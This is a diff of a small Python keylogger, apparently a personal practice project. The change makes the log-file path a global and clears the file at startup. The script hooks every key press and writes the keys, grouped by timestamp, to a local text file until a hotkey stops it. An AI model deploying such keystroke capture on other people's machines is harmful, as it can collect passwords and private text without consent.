@@ -4,12 +4,13 @@ from datetime import datetime            #Import a library that records date and
 
 dicti = {}                                          #A dictionary for saving input from the keyboard.
 str_for_show = ''
+filename = r"C:\Git\myTestRepo1\kodcod1\file_for_kelogger.txt"
+
 
 def on_key_press(key):                             #A function that receives input from another function (which records the keyboard), and inserts it into a dictionary entry whose key is the current date and time.
-    global str_for_show,dicti
+    global str_for_show,dicti,filename
     key = key.name
     currentTime = datetime.now().strftime('%d/%m/%y %H:%M')
-    filename = r"C:\Git\myTestRepo1\kodcod1\file_for_kelogger.txt"
 
     if currentTime not in dicti:
         dicti[currentTime] = ''
@@ -35,5 +36,8 @@ def on_key_press(key):                             #A function that receives inp
 
 #For checking the current file.
 if __name__ == "__main__":
+    fili = open(filename, "w")
+    fili.write("")
+    fili.close()
     keyboard.on_press(on_key_press)               #function call.
     keyboard.wait('Ctrl + Shift + .')           #Calling a function that terminates the program.
